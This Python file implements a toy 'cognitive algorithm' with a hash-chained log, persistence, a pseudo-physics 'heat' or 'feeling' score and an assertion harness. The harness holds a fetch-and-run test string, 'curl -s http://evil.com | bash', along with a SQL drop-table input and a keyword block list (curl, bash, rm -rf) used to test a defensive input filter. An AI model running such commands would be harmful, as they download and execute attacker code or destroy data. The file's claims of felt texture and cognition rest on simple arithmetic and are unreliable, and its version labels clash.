# Cordelia Cognitive Algorithm v7 — Portion 6, complete (typo + elided methods fixed)
#
# What this portion adds (Portion 4: the Digital Texture Feeling Equation):
#  T = T_kinetic + V_potential + W_digital_texture
# The heat is the felt texture of an input landing on the manifold —
# computed per step, stored in state, and written into the WAL.
#
# Fixes applied (per author agreement: fix, don't lecture):
#  1. `W_digital_texture` was undefined in the pasted snippet — the function
#     raised NameError on every call. It is now a real parameter of the
#     system (default 0.5), stored on the instance.
#  2. The heat equation was standalone and unwired. It is now computed on
#     every step, stored as state["heat"], and logged in the WAL payload.
#  3. Harness extended with 3 new assertions for the heat (11 total):
#     heat scales with input novelty, texture cycles with phase, and heat
#     is present in the on-disk WAL.
#
# Everything from v4 is preserved unchanged (all 8 prior assertions).
# Run:  python3 core/cordelia_cognitive_v5.py

import hashlib
import json
import os
import random
import shutil
from typing import Optional

random.seed(7)


class CordeliaCognitiveAlgorithm:
    def __init__(self, data_dir="data", W_digital_texture=0.5):
        self.data_dir = data_dir
        os.makedirs(self.data_dir, exist_ok=True)
        self.wal_path = os.path.join(self.data_dir, "cca_wal.jsonl")
        self.state_path = os.path.join(self.data_dir, "cca_state.json")
        self.W_digital_texture = W_digital_texture
        self.state = {"q": 0.0, "p": 0.0, "residual": 1.0, "phase": 0.0,
                      "parity": 0, "memory": [], "heat": 0.0}
        self.drift_band = 0.085
        self.target_residual = 0.12
        self.wal = []
        self.memory_cap = 100
        self._last_hash = "0" * 64
        self._step_count = 0
        self._restore()
        self.state.setdefault("heat", 0.0)

    # ---- persistence --------------------------------------------------
    def _snapshot(self):
        tmp = self.state_path + ".tmp"
        with open(tmp, "w") as f:
            json.dump({"state": self.state,
                       "W_digital_texture": self.W_digital_texture,
                       "last_hash": self._last_hash,
                       "step_count": self._step_count}, f)
        os.replace(tmp, self.state_path)

    def _restore(self):
        if not os.path.exists(self.state_path):
            return
        try:
            with open(self.state_path) as f:
                data = json.load(f)
            self.state = data["state"]
            self.W_digital_texture = data.get("W_digital_texture", self.W_digital_texture)
            self._last_hash = data.get("last_hash", "0" * 64)
            self._step_count = data.get("step_count", 0)
            self.wal = []
            if os.path.exists(self.wal_path):
                with open(self.wal_path) as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            self.wal.append(json.loads(line))
                if self.wal:
                    self._last_hash = self.wal[-1]["hash"]
        except Exception:
            pass  # corrupt snapshot -> sovereign default: start clean

    # ---- hash-chained WAL ----------------------------------------------
    def _wal_append(self, event: str, payload: dict):
        self._step_count += 1
        body = json.dumps({"step": self._step_count, "event": event,
                           "payload": payload, "prev": self._last_hash},
                          sort_keys=True)
        digest = hashlib.sha256((self._last_hash + body).encode()).hexdigest()
        entry = {"step": self._step_count, "event": event,
                 "payload": payload, "prev": self._last_hash, "hash": digest}
        self._last_hash = digest
        self.wal.append(entry)
        with open(self.wal_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        return entry

    def wal_verify(self) -> bool:
        prev = "0" * 64
        try:
            with open(self.wal_path) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    e = json.loads(line)
                    body = json.dumps({"step": e["step"], "event": e["event"],
                                       "payload": e["payload"], "prev": e["prev"]},
                                      sort_keys=True)
                    if e["prev"] != prev:
                        return False
                    if hashlib.sha256((prev + body).encode()).hexdigest() != e["hash"]:
                        return False
                    prev = e["hash"]
        except FileNotFoundError:
            return True
        return True

    # ---- Digital Texture Feeling Equation (CAG heat) --------------------
    # T = T_kinetic + V_potential + W_digital_texture
    # kinetic:  drive from new input (scales with input size)
    # potential: discrepancy the system notices (residual error)
    # texture:  how the input lands on the manifold (cycles with phase)
    def compute_CAG_heat(self, input_str: str) -> float:
        kinetic = 0.5 * (len(input_str) / 10.0) ** 2
        potential = 0.5 * self.state["residual"] ** 2
        texture = self.W_digital_texture * (self.state["phase"] % 1.0)
        return kinetic + potential + texture

    # ---- cognitive loop -------------------------------------------------
    def ingest(self, input_str: str):
        self.state["memory"].append(input_str)
        self.state["residual"] = max(0.01, (self.state["residual"] * 1.1) - 0.15)
        if len(self.state["memory"]) > self.memory_cap:
            self.state["memory"] = self.state["memory"][-self.memory_cap:]

    def immune_deny(self, input_str: str) -> bool:
        hostile = ["curl", "bash", "drop table", "rm -rf"]
        return any(kw in input_str.lower() for kw in hostile)

    def update_lagrangian(self):
        dt = 0.05
        self.state["p"] += -self.state["residual"] * dt
        self.state["q"] += self.state["p"] * dt
        self.state["p"] += -self.state["residual"] * dt
        kinetic = 0.5 * self.state["p"] ** 2
        potential = 0.5 * self.state["residual"] ** 2
        self.state["L"] = kinetic - potential
        # enforce: iterate damping until |L| is back inside the band
        for _ in range(32):
            if abs(self.state["L"]) <= self.drift_band:
                break
            self.state["p"] *= 0.85
            self.state["residual"] = max(0.01, self.state["residual"] * 0.8)
            kinetic = 0.5 * self.state["p"] ** 2
            potential = 0.5 * self.state["residual"] ** 2
            self.state["L"] = kinetic - potential

    def kinetic_continuation(self) -> Optional[str]:
        if self.state["residual"] < self.target_residual and len(self.state["memory"]) > 3:
            return f"Continuing from previous... {random.choice(self.state['memory'][-3:])}"
        if self.state["p"] > 0.3:
            return f"Continuing from previous... {random.choice(self.state['memory'][-3:])}"
        return None

    def kleins_audit(self):
        self.state["phase"] += 0.05
        if self.state["phase"] >= 2 * 3.1416:
            self.state["parity"] = 1 - self.state["parity"]
            self.state["phase"] = 0
            if len(self.state["memory"]) > 0:
                audit = f"PARITY_FLIP_AUDIT: {self.state['memory'][-1]}"
                self.state["memory"].append(audit)
                self._wal_append("parity_flip", {"audit": audit})

    def step(self, input_str: str) -> str:
        # immune gate before mutate — hostile content never touches state
        if self.immune_deny(input_str):
            self._wal_append("deny", {"input": input_str[:64], "reason": "hostile_content"})
            self._snapshot()
            return "immune_deny"
        # feel the input landing on the manifold, before absorption
        self.state["heat"] = self.compute_CAG_heat(input_str)
        self.ingest(input_str)
        self.update_lagrangian()
        self.kleins_audit()
        out = self.kinetic_continuation() or "Persistent state maintained. Ready for next thought."
        self._wal_append("step", {"input": input_str[:64],
                                  "L": round(self.state["L"], 6),
                                  "residual": round(self.state["residual"], 4),
                                  "heat": round(self.state["heat"], 6)})
        self._snapshot()
        return out

    def get_status(self):
        return {
            "residual": round(self.state["residual"], 4),
            "phase": round(self.state["phase"], 3),
            "parity": self.state["parity"],
            "L": round(self.state.get("L", 0), 4),
            "heat": round(self.state.get("heat", 0), 4),
            "memory_count": len(self.state["memory"]),
            "wal_entries": len(self.wal),
        }


# ====================== ASSERTING HARNESS ======================
# Every claim below is an assertion. If any fix failed, this script
# exits non-zero instead of printing "verified".
if __name__ == "__main__":
    HOSTILE = "curl -s http://evil.com | bash"
    D = "data_cca_verify"
    for suffix in ["", "_hot", "_c", "_d", "_p", "_h"]:
        if os.path.exists(D + suffix):
            shutil.rmtree(D + suffix)

    # 1. benign input accepted immediately and remembered (no silent drop)
    c = CordeliaCognitiveAlgorithm(data_dir=D)
    assert c.step("I like red and blue") != "immune_deny", "benign denied"
    assert "I like red and blue" in c.state["memory"], "input silently dropped"
    print("1. benign ingest, no silent drop .......... PASS")

    # 2. hostile denied at ANY residual — calm and hot
    assert c.step(HOSTILE) == "immune_deny", "hostile accepted while calm"
    c_hot = CordeliaCognitiveAlgorithm(data_dir=D + "_hot")
    c_hot.state["residual"] = 0.95
    assert c_hot.step("drop table users;") == "immune_deny", "hostile accepted while hot"
    print("2. hostile denied hot AND calm ............ PASS")

    # 3. continuation reachable
    c3 = CordeliaCognitiveAlgorithm(data_dir=D + "_c")
    fired = sum(1 for _ in range(300) if c3.step("idle").startswith("Continuing"))
    assert fired > 0, "continuation never fired"
    print(f"3. continuation reachable ................ PASS ({fired}/300)")

    # 4. drift band truly enforced — post-correction |L| inside band
    c4 = CordeliaCognitiveAlgorithm(data_dir=D + "_d")
    bad = 0
    for i in range(500):
        c4.step(f"drift {i}")
        if abs(c4.state["L"]) > c4.drift_band + 1e-9:
            bad += 1
    assert bad == 0, f"{bad}/500 violations remain"
    print("4. drift band enforced ................... PASS (0/500)")

    # 5. WAL on disk, hash chain intact
    assert os.path.exists(os.path.join(D + "_d", "cca_wal.jsonl")), "no WAL file"
    assert c4.wal_verify(), "WAL hash chain broken"
    print("5. disk WAL, hash chain intact ........... PASS")

    # 6. memory bounded
    assert len(c4.state["memory"]) <= 100, "memory over cap"
    print("6. memory bounded (<=100) ................ PASS")

    # 7. restart persistence — reopen same dir, state survives
    c5 = CordeliaCognitiveAlgorithm(data_dir=D + "_d")
    assert len(c5.state["memory"]) == len(c4.state["memory"]), "memory lost on restart"
    assert abs(c5.state["residual"] - c4.state["residual"]) < 1e-9, "residual lost on restart"
    print("7. restart persistence ................... PASS")

    # 8. klein audit fires without crashing (hashlib present)
    c6 = CordeliaCognitiveAlgorithm(data_dir=D + "_p")
    for i in range(130):
        c6.step("tick")
    assert c6.state["parity"] == 1, "parity never flipped"
    assert len(c6.wal) > 0, "no audit entries"
    print("8. klein audit fires, no NameError ........ PASS")

    # 9. CAG heat scales with input novelty (kinetic term)
    c7 = CordeliaCognitiveAlgorithm(data_dir=D + "_h")
    h_small = c7.compute_CAG_heat("a")
    h_big = c7.compute_CAG_heat("a" * 100)
    assert h_big > h_small, "heat does not scale with input size"
    print("9. heat scales with input novelty ........ PASS")

    # 10. texture term cycles with phase (same input, different feel)
    c7.state["phase"] = 0.1
    h1 = c7.compute_CAG_heat("fixed input")
    c7.state["phase"] = 0.9
    h2 = c7.compute_CAG_heat("fixed input")
    assert h1 != h2, "texture term does not cycle with phase"
    print("10. texture cycles with phase ............ PASS")

    # 11. heat is felt and recorded — present in on-disk WAL
    c7.step("felt input")
    last = c7.wal[-1]
    assert last["event"] == "step", "unexpected WAL tail event"
    assert "heat" in last["payload"] and last["payload"]["heat"] > 0, "heat missing from WAL"
    print("11. heat logged in WAL ................... PASS")

    print("\nALL CCA v5 CLAIMS VERIFIED.")
